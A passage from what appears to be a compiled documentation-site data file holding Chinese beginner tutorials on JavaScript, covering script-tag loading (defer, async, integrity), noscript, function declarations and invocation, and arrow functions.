的浏览器提供替代内容。虽然如今的浏览器已经 100%支持 JavaScript，但对于禁用 JavaScript 的浏览器来说，这个元素仍然有它的用处。 <noscript>元素可以包含任何可以出现在<body>中的 HTML 元素，<script>除外。在下列两种 情况下，浏览器将显示包含在<noscript>中的内容：\n\n * 浏览器不支持脚本；\n * 浏览器对脚本的支持被关闭。 任何一个条件被满足，包含在<noscript>中的内容就会被渲染。否则，浏览器不会渲染<noscript> 中的内容。\n\n下面是一个例子：\n<!DOCTYPE html> \n<html> \n <head> \n <title>Example HTML Page</title> \n <script defer="defer" src="example1.js"><\/script> \n <script defer="defer" src="example2.js"><\/script> \n </head> \n <body> \n <noscript> \n <p>This page requires a JavaScript-enabled browser.</p> \n </noscript> \n </body> \n</html> \n这个例子是在脚本不可用时让浏览器显示一段话。如果浏览器支持脚本，则用户永远不会看到它。\n',normalizedContent:'# ecmascript 介绍\n\n🎉 💯\n\n> javascript 是世界上最流行的脚本语言，因为你在电脑、手机、平板上浏览的所有的网页，以及无数基于 html5 的手机 app，交互逻辑都是由 javascript 驱动的。我们可以通过 javascript 提供的 api 可以实现一些交互效果开发，使用 ajax 可以与后台进行数据的交互。在 web 世界里，只有 javascript 能跨平台、跨浏览器驱动网页，与用户交互。\n\njavascript 是一门跨平台、面向对象的动态的弱类型的轻量级解释型语言，是一种基于对象和事件驱动并具有相对安全性的客户端脚本语言。\n\n虽然它是作为开发 web 页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，例如 node.js。\n\n\n# 应用场景\n\nwarning\n\njavascript 通常被称为 js，他发明的目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力，他可以让网页呈现出各种特殊效果，为用户提供友好的互动体验。随着 ajax 技术的出现，前端可以在不刷新页面的情况下和后端进行数据交换，更新页面数据，jquery 等库的盛行让 js 编写变得异常简单，bootstrap 框架更让前端的成本无限降低，大大提高了前端开发的效率，js 在前端领域前景非常广阔。\n\n随着 node 的发布，使得 js 不仅可以运行在前端，还可以运行在服务器上。这对 js 来说是一次质的突破，node.js 项目使得 js 可以用于开发服务器端的大型项目，网站的前后端都用 js 开发已经称为了现实。\n\n\n# javascript 组成部分\n\ntip\n\n尽管 ecmascript 是一个重要的标准，但它并不是 javascript 唯一的部分，当然，也不是唯一被标准化的部分。实际上，一个完整的 javascript 实现是由以下 3 个不同部分组成的：\n\n名称            介绍\necmascript    是 javascript 基础规范，定义了 javascript 基础语法。\nbom 浏览器对象模型   可以对浏览器窗口进行访问和操作。\ndom 文档对象模型    通过创建树来表示文档，从而使开发者对文档的内容和结构具有控制力。用 dom api 可以轻松操作文档。\n\n\n# ecmascript 版本\n\n从 ecmascript2016 开始，ecmascript 将进入每年发布一次新标准的阶段。\n\nes1    es2    es3    es4   es5    es5.1   es2015(es6)   es2016   es2017   es2018   es2019   ...\n1997   1998   1999   夭折    2009   2011    2015          2016     2017     2018     2019     ....\n\n\n# ecmascript 2015（es6）浏览器支持情况\n\n支持 ecmascript 2015 规范。功能包括 promises，modules，classes，template literals，arrow functions，let and const，default parameters，generators，destructuring assignment，rest＆spread，map / set＆weakmap / weakset 等等。\n\n\n# javascript 在你的页面上做什么？\n\n当你在浏览器中打开一个网页，该运行环境（浏览器标签）将会执行你的代码（html, css 和 javascript）。这就像是一个工厂，获取原材料（代码）然后出产一个产品（网页）。\n\n在 html 和 css 已经被集合和组装成一个网页后，浏览器的 javascript 引擎再执行 javascript。这保证了当 javascript 开始运行时，网页的结构和样式已经在该出现的地方了。\n\n> 注意：如果 javascript 在 html 和 css 加载完成之前加载运行，那么会发生错误。\n\n\n# 浏览器安全\n\n每个浏览器标签本身就是一个用来运行代码的分离的容器（这些容器用专业术语称为“运行环境”）——这意味着在大多数情况中，每个标签中的代码是完全分离地运行，而且在一个标签中的代码不能直接影响在另一个标签中的代码——或者在另一个网站中的。这是一个好的安全措施\n\n\n# javascript 特点\n\n 1. 弱类型\n    javascript 是弱类型语言。但所谓弱类型语言，只表明该语言在表达式运算中不强制效验运算元的数据类型。\n 2. 解释型(解释型或即时编译型)\n 3. 基于对象\n    js 种所有数据根源上都是对象\n 4. 事件驱动\n 5. 单线程/异步(callback)\n\n\n# 解释代码 vs 编译代码\n\n在编程环境中，你或许听说过这两个术语 解释 [interpreted] 和 编译 [compiled]。javascript 是一个解释语言——代码从上到下运行，而运行的结果会马上被返回。在浏览器运行代码前，你不必先把它转化为其他形式。\n\n另一方面来说，编译语言则需要在运行前转化为另一种形式。比如说 c/c++ 则要先被编译成汇编语言，然后再由电脑运行。\n\n解释型语言的程序不需要在运行前编译，在运行程序的时候才翻译。省去编译过程，但是每执行一次就要翻译一次，效率比较低\n\n\n# 异步编程\n\njavascript 由于某种原因是被设计为单线程的，同时由于 javascript 在设计之初是用于浏览器的 gui 编程，这也就需要线程不能进行阻塞。\n\n所以在后续的发展过程中基本都采用异步非阻塞的编程模式。\n\n简单来说，异步编程就是在执行一个指令之后不是马上得到结果，而是继续执行后面的指令，等到特定的事件触发后，才得到结果。\n\n也正是因为这样，我们常常会说: javascript 是由事件驱动的 。\n\n\n# 怎样向你的页面添加 javascript？\n\njavascript 以一种近似于 css 的方式应用到你的 html 页面中。尽管 css 使用 <link> 元素去应用外部的样式表 [stylesheet] 和 <style> 元素去应用内部的样式表到 html，javascript 只需要在 html 世界里的一个元素—— <script> 元素。\n\n\n# 嵌入 html 的 javascript\n\n<script>\n  // javascript goes here\n<\/script>\n\n\n\n# 外部引入的 javascript\n\n外部的 javascript 命名为 script.js ——保证它以 .js 为文件扩展名，因为这是它被认作是 javascript 的方式。\n\n<script src="script.js"><\/script>\n\n\n\n# script 元素\n\n参数            描述   示例\nasync         可选   表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载。只对外部脚本文件有效。\ncharset       可选   使用 src 属性指定的代码字符集。这个属性很少使用，因为大多数浏览器不在乎它的值\ncrossorigin   可选   配置相关请求的cors（跨源资源共享）设置。默认不使用cors。crossorigin=\n                   "anonymous"配置文件请求不必设置凭据标志crossorigin="use-credentials"设置凭据标志，意味着出站请求会包含凭据。\ndefer         可选   可选。表示脚本可以延迟到文档完全被解析和显示之后再执行。只对外部脚本文件有效。在 ie7\n                   及更早的版本中，对行内脚本也可以指定这个属性。\nintegrity     可选   允许比对接收到的资源和指定的加密签名以验证子资源完整性（sri，subresource\n                   integrity）。如果接收到的资源的签名与这个属性指定的签名不匹配，则页面会报错，脚本不会执行。这个属性可以用于确保内容分发网络（cdn，content\n                   delivery network）不会提供恶意内容。\nlanguage      废弃   最初用于表示代码块中的脚本语言（如"javascript"、"javascript\n                   1.2"或"vbscript"）。大多数浏览器都会忽略这个属性，不应该再使用它。\nsrc           可选   表示包含要执行的代码的外部文件。\ntype          可选   代替 language，表示代码块中脚本语言的内容类型（也称 mime 类型）\n                   按照惯例，这个值始终都是"text/javascript"，尽管"text\n                   javascript"和"text/ecmascript"都已经废弃了。javascript 文件的 mime\n                   类型通常是"application/x-javascript"，不过给type 属性这个值有可能导脚本被忽略。在非 ie\n                   的浏览器中有效的其他值还有"application/javascript"和"application/ecmascript"。如果这个值是\n                   module，则代码会被当成 es6 模块，而且只有这时候代码中才能出现 import 和 export 关键字。\n\n\n# 注释\n\n> 可以添加注释来对 javascript 进行解释，提高代码的可读性，还可以用于停靠代码。\n\n一个单行注释书写在一个双正斜杠后 (//)，比如：\n\n// i am a comment\n\n\n一个多行注释书写在字符串/*和 */ 之间， 比如：\n\n/*\n  i am also\n  a comment\n*/\n\n\n\n# 输入输出工具\n\n方法                 描述              示例\ndocument.write()   输出内容到 body 页面   documetn.write("hello, world")\nprompt()           输入框             prompt("请输入信息")\nalert()            弹出框             alert("用户名错误")\nconsole.log()      输出内容到浏览器控制台     console.log("js是一门编程语言")\n\n\n# 名词解释\n\n\n# 标识符\n\n标识符可以分为两类：\n\n * 用于命名语法(以及类型)，被称为"语法关键字"\n * 用于命名值(的存储位置)，被称为"变量"和"常量"\n\n由此引入了一个概念：绑定。 从标识符的角度来说，就分为：\n\n * 语法关键字与语法(语义)逻辑的绑定，语法关键字与语法(语义)逻辑绑定的结果是作用域的限定；\n * 变量与它所存储值得位置的绑定，变量对位置的绑定的结果，则是变量生存周期的限定；\n\n\n# 声明\n\n程序语言中"声明"的意义：所谓声明，即是约定变量的生存周期和逻辑的作用域。\n\n * 纯粹陈述"值"的过程，被称为变量和类型声明；\n * 纯粹陈述"逻辑"的过程，被称为语句(含流程控制子句)；\n * 陈述"值与(算法的)逻辑"的关系的过程，被称为表达式；\n\n\n# 错误类型\n\n一般来说，当你的代码出错的时候，你会遇到两种主要的错误类型：\n\n# 语法错误\n\n这是你的代码的拼写错误，实际上导致程序不能运行在所有或停止通过工作的一部分，这样你通常会用一些提供的错误消息找到修复的方法，只要你熟悉正确的工具，知道错误消息的意思！\n\n一般来说，javascript 引擎会在代码装入时先进行语法分析，如果语法分析通不过，整个脚本代码块都不会执行；(如一个人在演讲时，先检查演讲稿语句是否通顺，不通顺则不讲)\n\n当语法分析通过时，才会执行这段脚本代码。若在执行过程中出错，那么在同一代码上下文中、出错点之后的代码将不再执行。\n\n# 逻辑错误\n\n这些错误，其中语法实际上是正确的，但代码是不是你想要的，这意味着项目成功运行，但会产生不正确的结果。这些通常比语法错误更难以修复，因为通常没有错误指向错误源。\n\n\n# 语句结尾分号\n\njs 语句的一个分号代表了一段代码的结束，但问题是 javascript 允许不写分号，这样就出现了一个问题，代码的结束与否不是你来决定的而是由程序来决定的，而程序也不是万能的，往往它只是走的某个规则，而如果你写的这段代码和它的规则不符，最终的结果就有些不如人意了。\n\nvar n1 = 10,\n  n2 = 100(n1 + n2) * 10; // 报错： 100 is not a function\n\n\n会导致上下行解析出问题的符号有 5 个：()，[]，\\，+，-。\n\n总结：一行开头是括号或者方括号的时候上一行必须分号结束，其他时候都可以不需要。\n\n\n# 参考\n\n * 参考1\n * 参考2\n\n\n# 注意事项\n\n\n# script 元素使用\n\n> 包含在<script>内的代码会被从上到下解释。在上面的例子中，被解释的是一个函数定义，并且 该函数会被保存在解释器环境中。在<script>元素中的代码被计算完成之前，页面的其余内容不会被 加载，也不会被显示。\n\n在使用行内 javascript 代码时，要注意代码中不能出现字符串。比如，下面的代码会导致浏览器报错：\n\n<script> \n function sayscript() { \n console.log("<\/script>"); \n } \n<\/script>\n\n\n浏览器解析行内脚本的方式决定了它在看到字符串时，会将其当成结束的 标签。想避免这个问题，只需要转义字符“\\”①即可：\n\n<script> \n function sayscript() { \n console.log("<\\/script>"); \n } \n<\/script>\n// 这样修改之后，代码就可以被浏览器完全解释，不会导致任何错误。\n\n\ntip\n\n按照惯例，外部 javascript 文件的扩展名是.js。这不是必需的，因为浏览器不会检 查所包含 javascript 文件的扩展名。这就为使用服务器端脚本语言动态生成 javascript 代 码，或者在浏览器中将 javascript扩展语言（如typescript，或react的 jsx）转译为javascript 提供了可能性。不过要注意，服务器经常会根据文件扩展来确定响应的正确 mime 类型。 如果不打算使用.js 扩展名，一定要确保服务器能返回正确的 mime 类型。\n\n使用了 src 属性的<script>元素不应该再在<script>和<\/script>标签中再包含其他 javascript 代码。如果两者都提供的话，则浏览器只会下载并执行脚本文件，从而忽略行内代码.\n\n<script src="example.js">\n// 以下不执行\nconsole.log(1)\n<\/script>\n\n\n<script>元素的一个最为强大、同时也备受争议的特性是，它可以包含来自外部域的 javascript 文件。跟<img>元素很像，<script>元素的 src 属性可以是一个完整的 url，而且这个 url 指向的 资源可以跟包含它的 html 页面不在同一个域中，比如这个例子：\n\n<script src="http://www.somewhere.com/afile.js"><\/script>\n\n浏览器在解析这个资源时，会向 src 属性指定的路径发送一个 get 请求，以取得相应资源，假定 是一个 javascript 文件。这个初始的请求不受浏览器同源策略限制，但返回并被执行的 javascript 则受限 制。当然，这个请求仍然受父页面 http/https 协议的限制。\n\n来自外部域的代码会被当成加载它的页面的一部分来加载和解释。这个能力可以让我们通过不同的 域分发 javascript。\n\n不过，引用了放在别人服务器上的 javascript 文件时要格外小心，因为恶意的程序员 随时可能替换这个文件。在包含外部域的 javascript 文件时，要确保该域是自己所有的，或者该域是一 个可信的来源。\n\n<script>标签的 integrity 属性是防范这种问题的一个武器，但这个属性也不是所有 浏览器都支持。\n\n不管包含的是什么代码，浏览器都会按照<script>在页面中出现的顺序依次解释它们，前提是它 们没有使用 defer 和 async 属性。第二个<script>元素的代码必须在第一个<script>元素的代码解 释完毕才能开始解释，第三个则必须等第二个解释完，以此类推。`\n\n\n# 标签位置\n\n> 过去，所有<script>元素都被放在页面的<head>标签内，如下面的例子所示：\n\n<!doctype html> \n<html> \n <head> \n <title>example html page</title> \n <script src="example1.js"><\/script> \n <script src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html>\n\n\ntip\n\n这种做法的主要目的是把外部的 css 和 javascript 文件都集中放到一起。不过，把所有 javascript 文件都放在<head>里，也就意味着必须把所有 javascript 代码都下载、解析和解释完成后，才能开始渲 染页面（页面在浏览器解析到<body>的起始标签时开始渲染）。\n\n对于需要很多 javascript 的页面，这会导致页面渲染的明显延迟，在此期间浏览器窗口完全空白。为解决这个问题，现代 web 应用程序通常 将所有 javascript 引用放在<body>元素中的页面内容后面，如下面的例子所示：\n\n<!doctype html> \n<html> \n <head> \n <title>example html page</title> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n <script src="example1.js"><\/script> \n <script src="example2.js"><\/script> \n </body> \n</html>\n\x3c!-- 这样一来，页面会在处理 javascript 代码之前完全渲染页面。用户会感觉页面加载更快了，因为浏\n览器显示空白页面的时间短了。 --\x3e\n\n\n\n# 推迟执行脚本\n\n> html 4.01 为<script>元素定义了一个叫 defer 的属性。这个属性表示脚本在执行的时候不会改 变页面的结构。也就是说，脚本会被延迟到整个页面都解析完毕后再运行。因此，在<script>元素上 设置 defer 属性，相当于告诉浏览器立即下载，但延迟执行。\n\n<!doctype html> \n<html> \n <head> \n <title>example html page</title> \n <script defer src="example1.js"><\/script> \n <script defer src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html> \n\n\n虽然这个例子中的<script>元素包含在页面的<head>中，但它们会在浏览器解析到结束的 </html>标签后才会执行。\n\n对 defer 属性的支持是从 ie4、firefox 3.5、safari 5 和 chrome 7 开始的。其他所有浏览器则会忽略这 个属性，按照通常的做法来处理脚本。考虑到这一点，还是把要推迟执行的脚本放在页面底部比较好。\n\n\n# 异步执行脚本\n\n> html5 为<script>元素定义了 async 属性。从改变脚本处理方式上看，async 属性与 defer 类似。当然，它们两者也都只适用于外部脚本，都会告诉浏览器立即开始下载。不过，与 defer 不同的是，标记为 async 的脚本并不保证能按照它们出现的次序执行，比如：\n\n<!doctype html> \n<html> \n <head> \n <title>example html page</title> \n <script async src="example1.js"><\/script> \n <script async src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html>\n\x3c!-- 在这个例子中，第二个脚本可能先于第一个脚本执行。因此，重点在于它们之间没有依赖关系。给\n脚本添加 async 属性的目的是告诉浏览器，不必等脚本下载和执行完后再加载页面，同样也不必等到\n该异步脚本下载和执行后再加载其他脚本。正因为如此，异步脚本不应该在加载期间修改 dom。 --\x3e\n\n\n\n# 动态加载脚本\n\n除了<script>标签，还有其他方式可以加载脚本。因为 javascript 可以使用 dom api，所以通过 向 dom 中动态添加 script 元素同样可以加载指定的脚本。只要创建一个 script 元素并将其添加到 dom 即可。\n\nlet script = document.createelement(\'script\'); \nscript.src = \'gibberish.js\'; \ndocument.head.appendchild(script);\n\n\n当然，在把 htmlelement 元素添加到 dom 且执行到这段代码之前不会发送请求。默认情况下， 以这种方式创建的<script>元素是以异步方式加载的，相当于添加了 async 属性。不过这样做可能会 有问题，因为所有浏览器都支持 createelement()方法，但不是所有浏览器都支持 async 属性。因此， 如果要统一动态脚本的加载行为，可以明确将其设置为同步加载：\n\nlet script = document.createelement(\'script\'); \nscript.src = \'gibberish.js\'; \nscript.async = false; \ndocument.head.appendchild(script);\n\n\n以这种方式获取的资源对浏览器预加载器是不可见的。这会严重影响它们在资源获取队列中的优先 级。根据应用程序的工作方式以及怎么使用，这种方式可能会严重影响性能。要想让预加载器知道这些 动态请求文件的存在，可以在文档头部显式声明它们： <link rel="preload" href="gibberish.js">\n\n\n# <noscript>元素\n\n> 针对早期浏览器不支持 javascript 的问题，需要一个页面优雅降级的处理方案。最终，<noscript> 元素出现，被用于给不支持 javascript 的浏览器提供替代内容。虽然如今的浏览器已经 100%支持 javascript，但对于禁用 javascript 的浏览器来说，这个元素仍然有它的用处。 <noscript>元素可以包含任何可以出现在<body>中的 html 元素，<script>除外。在下列两种 情况下，浏览器将显示包含在<noscript>中的内容：\n\n * 浏览器不支持脚本；\n * 浏览器对脚本的支持被关闭。 任何一个条件被满足，包含在<noscript>中的内容就会被渲染。否则，浏览器不会渲染<noscript> 中的内容。\n\n下面是一个例子：\n<!doctype html> \n<html> \n <head> \n <title>example html page</title> \n <script defer="defer" src="example1.js"><\/script> \n <script defer="defer" src="example2.js"><\/script> \n </head> \n <body> \n <noscript> \n <p>this page requires a javascript-enabled browser.</p> \n </noscript> \n </body> \n</html> \n这个例子是在脚本不可用时让浏览器显示一段话。如果浏览器支持脚本，则用户永远不会看到它。\n',charsets:{cjk:!0}},{title:"函数声明与调用",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/01-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%B0%83%E7%94%A8.html",relativePath:"Javascript/Javascript基础语法/05-函数/01-函数声明与调用.md",key:"v-160d8211",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/01-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%B0%83%E7%94%A8.html",headers:[{level:2,title:"什么是函数?",slug:"什么是函数",normalizedTitle:"什么是函数?",charIndex:14},{level:2,title:"函数声明方式",slug:"函数声明方式",normalizedTitle:"函数声明方式",charIndex:156},{level:3,title:"function关键字",slug:"function关键字",normalizedTitle:"function关键字",charIndex:167},{level:3,title:"字面量定义(匿名函数)",slug:"字面量定义-匿名函数",normalizedTitle:"字面量定义(匿名函数)",charIndex:251},{level:3,title:"实例化构造函数",slug:"实例化构造函数",normalizedTitle:"实例化构造函数",charIndex:336},{level:2,title:"函数调用方式",slug:"函数调用方式",normalizedTitle:"函数调用方式",charIndex:395},{level:3,title:"通过括号调用",slug:"通过括号调用",normalizedTitle:"通过括号调用",charIndex:406},{level:3,title:"自调用(IIFE)",slug:"自调用-iife",normalizedTitle:"自调用(iife)",charIndex:507},{level:3,title:"通过事件调用",slug:"通过事件调用",normalizedTitle:"通过事件调用",charIndex:655},{level:2,title:"注意事项",slug:"注意事项",normalizedTitle:"注意事项",charIndex:736},{level:3,title:"问题1：函数声明覆盖",slug:"问题1-函数声明覆盖",normalizedTitle:"问题1：函数声明覆盖",charIndex:873},{level:3,title:"问题2：函数调用顺序",slug:"问题2-函数调用顺序",normalizedTitle:"问题2：函数调用顺序",charIndex:1017},{level:3,title:"问题3：函数在不同块调用顺序",slug:"问题3-函数在不同块调用顺序",normalizedTitle:"问题3：函数在不同块调用顺序",charIndex:1284},{level:2,title:"箭头函数",slug:"箭头函数",normalizedTitle:"箭头函数",charIndex:1536},{level:3,title:"箭头函数语法",slug:"箭头函数语法",normalizedTitle:"箭头函数语法",charIndex:1583},{level:3,title:"没有局部this的绑定",slug:"没有局部this的绑定",normalizedTitle:"没有局部this的绑定",charIndex:1813},{level:3,title:"箭头函数需要注意的点",slug:"箭头函数需要注意的点",normalizedTitle:"箭头函数需要注意的点",charIndex:1961},{level:3,title:"不适用场合",slug:"不适用场合",normalizedTitle:"不适用场合",charIndex:2135}],headersStr:"什么是函数? 函数声明方式 function关键字 字面量定义(匿名函数) 实例化构造函数 函数调用方式 通过括号调用 自调用(IIFE) 通过事件调用 注意事项 问题1：函数声明覆盖 问题2：函数调用顺序 问题3：函数在不同块调用顺序 箭头函数 箭头函数语法 没有局部this的绑定 箭头函数需要注意的点 不适用场合",content:'# 函数声明与调用\n\n\n# 什么是函数?\n\n函数：将完成某一特定功能的代码封装起来，并且可以重复调用的代码块。\n\n为何使用函数？\n\n 1. 能够对代码进行复用：只要定义一次代码，就可以多次使用它。\n\n * 能够多次向同一函数传递不同的参数，以产生不同的结果。\n * 使程序更加简洁、具有逻辑性、维护方便\n\n\n# 函数声明方式\n\n\n# function关键字\n\nfunction 函数名([参数1],[参数2],...[参数n]){\n    函数体\n    [retrun]  //返回值\n}\n\n\n\n# 字面量定义(匿名函数)\n\nvar 变量 = function ([参数1],[参数2]....){\n    函数体\n    [retrun]  //返回值\n}\n\n\n\n# 实例化构造函数\n\nvar 变量 = new Function([参数1],[参数2]...,"函数体");\n\n\n\n# 函数调用方式\n\n\n# 通过括号调用\n\n用于具名函数的调用\n\n * 函数名()\n * 变量名()\n\nfunction fun1(){}\nfun1()\n\nvar fun2 = function (){}\nfun2()\n\n\n\n# 自调用(IIFE)\n\n用于匿名函数的调用，匿名函数还可以通引用变量来调用。\n\n//第一种\n(function (){})()\n\n//第二种\n!function(){\n\n}()\n\n//第三种\n(function(){\n\n}())\n\n\n> 注意： 在进行函数自调用时，上一条语句必须结尾有;\n\n\n# 通过事件调用\n\n<script>\n    function fun(){}\n<\/script>\n<div onclick="fun()"></div>\n\n\n\n# 注意事项\n\n创建/调用函数注意问题:\n\n 1. 如果两个函数的命名相同，后面的将会覆盖前面的函数。\n 2. 以function声明的函数可以前置调用，以字面量方式声明方式后置调用。\n 3. 在不同的<script><\/script>块中声明函数，声明之后块中调用。\n\n\n# 问题1：函数声明覆盖\n\n如果两个函数的命名相同，后面的将会覆盖前面的函数。\n\nfunction bb(){\n    alert("这是第一个声明");\n}\nfunction bb(){\n    alert("这是第二个声明");\n}\nbb(); //结果为  “这是第二个声明\n\n\n\n# 问题2：函数调用顺序\n\n以基本语法声明的函数，会在页面载入的时候提前解析到内存中，以便调用。所以可以在函数的前面调用。但是以字面量形式命名的函数，会在执行到他的时候，才进行赋值。所以只能在函数的后面调用。\n\naa();      // 结果为 弹出 1\nfunction aa(){\n    alert(1)\n}\naa();      // 结果为 弹出 1\n\n\naa();      // 报错 aa is not a function\nvar aa = function(){\n    alert(1)\n}\naa();\n\n\n\n# 问题3：函数在不同块调用顺序\n\n在不同的<script><\/script>块中，因为浏览器解析的时候是分块解析的，所以前面的块不能调用后面块的函数，所以在不同的块之间调用函数的时候，应该先定义后调用。\n\n<script>\n    aa();      //报错\n<\/script>\n<script>\n    function aa(){\n        alert(1)\n    }\n<\/script>\n<script>\n    aa()       //结果为 弹出 1\n<\/script>\n\n\n\n# 箭头函数\n\nES6标准新增了一种新的函数：Arrow Function（箭头函数）。\n\n\n# 箭头函数语法\n\n箭头函数表达式的语法比普通函数表达式更简洁。\n\n(参数1, 参数2, …, 参数N) => { 函数声明 }\n\n(参数1, 参数2, …, 参数N) => 表达式(单一)\n// 相当于：(参数1, 参数2, …, 参数N) =>{ return 表达式; }\n\n\n当只有一个参数时，圆括号是可选的：\n\n(单一参数) => {函数声明}\n单一参数 => {函数声明}\n\n\n没有参数的函数应该写成一对圆括号:\n\n() => {函数声明}\n\n\n\n# 没有局部this的绑定\n\nTIP\n\n和一般的函数不同，箭头函数不会绑定this。 或者说箭头函数不会改变this本来的绑定。它没有自己的this对象，内部的this就是定义时上层作用域中的this。也就是说，箭头函数内部的this指向是固定的，相比之下，普通函数的this指向是可变的。\n\n\n# 箭头函数需要注意的点\n\n * 箭头函数没有自己的this对象。\n * 不可以当作构造函数，也就是说，不可以对箭头函数使用new命令，否则会抛出一个错误。\n * 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。\n * 不可以使用yield命令，因此箭头函数不能用作 Generator 函数。\n\n\n# 不适用场合\n\n> 由于箭头函数使得this从“动态”变成“静态”，下面两个场合不应该使用箭头函数。\n\n * 第一个场合是定义对象的方法，且该方法内部包括this。\n\nconst cat = {\n  lives: 9,\n  jumps: () => {\n    this.lives--;\n  }\n}\n\n\n> 上面代码中，cat.jumps()方法是一个箭头函数，这是错误的。调用cat.jumps()时，如果是普通函数，该方法内部的this指向cat；如果写成上面那样的箭头函数，使得this指向全局对象，因此不会得到预期结果。这是因为对象不构成单独的作用域，导致jumps箭头函数定义时的作用域就是全局作用域。',normalizedContent:'# 函数声明与调用\n\n\n# 什么是函数?\n\n函数：将完成某一特定功能的代码封装起来，并且可以重复调用的代码块。\n\n为何使用函数？\n\n 1. 能够对代码进行复用：只要定义一次代码，就可以多次使用它。\n\n * 能够多次向同一函数传递不同的参数，以产生不同的结果。\n * 使程序更加简洁、具有逻辑性、维护方便\n\n\n# 函数声明方式\n\n\n# function关键字\n\nfunction 函数名([参数1],[参数2],...[参数n]){\n    函数体\n    [retrun]  //返回值\n}\n\n\n\n# 字面量定义(匿名函数)\n\nvar 变量 = function ([参数1],[参数2]....){\n    函数体\n    [retrun]  //返回值\n}\n\n\n\n# 实例化构造函数\n\nvar 变量 = new function([参数1],[参数2]...,"函数体");\n\n\n\n# 函数调用方式\n\n\n# 通过括号调用\n\n用于具名函数的调用\n\n * 函数名()\n * 变量名()\n\nfunction fun1(){}\nfun1()\n\nvar fun2 = function (){}\nfun2()\n\n\n\n# 自调用(iife)\n\n用于匿名函数的调用，匿名函数还可以通引用变量来调用。\n\n//第一种\n(function (){})()\n\n//第二种\n!function(){\n\n}()\n\n//第三种\n(function(){\n\n}())\n\n\n> 注意： 在进行函数自调用时，上一条语句必须结尾有;\n\n\n# 通过事件调用\n\n<script>\n    function fun(){}\n<\/script>\n<div onclick="fun()"></div>\n\n\n\n# 注意事项\n\n创建/调用函数注意问题:\n\n 1. 如果两个函数的命名相同，后面的将会覆盖前面的函数。\n 2. 以function声明的函数可以前置调用，以字面量方式声明方式后置调用。\n 3. 在不同的<script><\/script>块中声明函数，声明之后块中调用。\n\n\n# 问题1：函数声明覆盖\n\n如果两个函数的命名相同，后面的将会覆盖前面的函数。\n\nfunction bb(){\n    alert("这是第一个声明");\n}\nfunction bb(){\n    alert("这是第二个声明");\n}\nbb(); //结果为  “这是第二个声明\n\n\n\n# 问题2：函数调用顺序\n\n以基本语法声明的函数，会在页面载入的时候提前解析到内存中，以便调用。所以可以在函数的前面调用。但是以字面量形式命名的函数，会在执行到他的时候，才进行赋值。所以只能在函数的后面调用。\n\naa();      // 结果为 弹出 1\nfunction aa(){\n    alert(1)\n}\naa();      // 结果为 弹出 1\n\n\naa();      // 报错 aa is not a function\nvar aa = function(){\n    alert(1)\n}\naa();\n\n\n\n# 问题3：函数在不同块调用顺序\n\n在不同的<script><\/script>块中，因为浏览器解析的时候是分块解析的，所以前面的块不能调用后面块的函数，所以在不同的块之间调用函数的时候，应该先定义后调用。\n\n<script>\n    aa();      //报错\n<\/script>\n<script>\n    function aa(){\n        alert(1)\n    }\n<\/script>\n<script>\n    aa()       //结果为 弹出 1\n<\/script>\n\n\n\n# 箭头函数\n\nes6标准新增了一种新的函数：arrow function（箭头函数）。\n\n\n# 箭头函数语法\n\n箭头函数表达式的语法比普通函数表达式更简洁。\n\n(参数1, 参数2, …, 参数n) => { 函数声明 }\n\n(参数1, 参数2, …, 参数n) => 表达式(单一)\n// 相当于：(参数1, 参数2, …, 参数n) =>{ return 表达式; }\n\n\n当只有一个参数时，圆括号是可选的：\n\n(单一参数) => {函数声明}\n单一参数 => {函数声明}\n\n\n没有参数的函数应该写成一对圆括号:\n\n() => {函数声明}\n\n\n\n# 没有局部this的绑定\n\ntip\n\n和一般的函数不同，箭头函数不会绑定this。 或者说箭头函数不会改变this本来的绑定。它没有自己的this对象，内部的this就是定义时上层作用域中的this。也就是说，箭头函数内部的this指向是固定的，相比之下，普通函数的this指向是可变的。\n\n\n# 箭头函数需要注意的点\n\n * 箭头函数没有自己的this对象。\n * 不可以当作构造函数，也就是说，不可以对箭头函数使用new命令，否则会抛出一个错误。\n * 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。\n * 不可以使用yield命令，因此箭头函数不能用作 generator 函数。\n\n\n# 不适用场合\n\n> 由于箭头函数使得this从“动态”变成“静态”，下面两个场合不应该使用箭头函数。\n\n * 第一个场合是定义对象的方法，且该方法内部包括this。\n\nconst cat = {\n  lives: 9,\n  jumps: () => {\n    this.lives--;\n  }\n}\n\n\n> 上面代码中，cat.jumps()方法是一个箭头函数，这是错误的。调用cat.jumps()时，如果是普通函数，该方法内部的this指向cat；如果写成上面那样的箭头函数，使得this指向全局对象，因此不会得到预期结果。这是因为对象不构成单独的作用域，导致jumps箭头函数定义时的作用域就是全局作用域。',charsets:{cjk:!0}},{title:"变量与数据类型",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/02-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html",relativePath:"Javascript/Javascript基础语法/02-变量与数据类型.md",key:"v-6b592820",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/02-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html",headers:[{level:2,title:"标识符命名规范",slug:"标识符命名规范",normalizedTitle:"标识符命名规范",charIndex:34},{level:3,title:"命名规范",slug:"命名规范",normalizedTitle:"命名规范",charIndex:37},{level: